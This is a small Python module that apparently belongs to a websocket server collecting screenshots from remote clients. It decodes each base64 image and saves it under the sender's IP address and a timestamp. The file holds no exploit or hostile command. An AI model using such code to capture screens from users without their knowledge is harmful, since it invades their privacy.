import time
from modules.abstractModule import Module
from PIL import Image
import base64
import io


class ScreenshotModule(Module):
    type = 'screenshot'

    async def handleMessage(self, websocket, msg):
        image = Image.open(io.BytesIO(
            base64.b64decode(msg.split("base64,")[1])))
        image.save(f"{websocket.remote_ip + str(time.time()) + '.png'}")
        await super().sendMessage(websocket)
